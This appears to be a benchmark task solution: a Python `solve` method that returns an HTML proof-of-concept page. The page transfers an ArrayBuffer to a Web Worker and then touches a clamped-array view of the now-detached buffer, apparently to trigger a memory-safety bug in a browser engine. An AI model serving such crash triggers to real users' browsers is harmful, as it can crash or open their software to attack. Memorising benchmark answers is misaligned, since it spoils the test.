class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """<!DOCTYPE html>
<html>
<body>
<script>
const workerScript = `
onmessage = function(e) {
  const ab = e.data;
  const view = new Uint8Array(ab);
  view[0] = 0;
  self.close();
};
`;
const blob = new Blob([workerScript], { type: 'application/javascript' });
const workerUrl = URL.createObjectURL(blob);
const worker = new Worker(workerUrl);
const length = 4096;
const ab = new ArrayBuffer(length);
const clamped = new Uint8ClampedArray(ab);
clamped[0] = 200;
worker.postMessage(ab, [ab]);
setTimeout(() => {
  clamped[0] = 300;
  console.log(clamped[0]);
}, 10);
setTimeout(() => URL.revokeObjectURL(workerUrl), 100);
</script>
</body>
</html>"""
        return poc.encode('utf-8')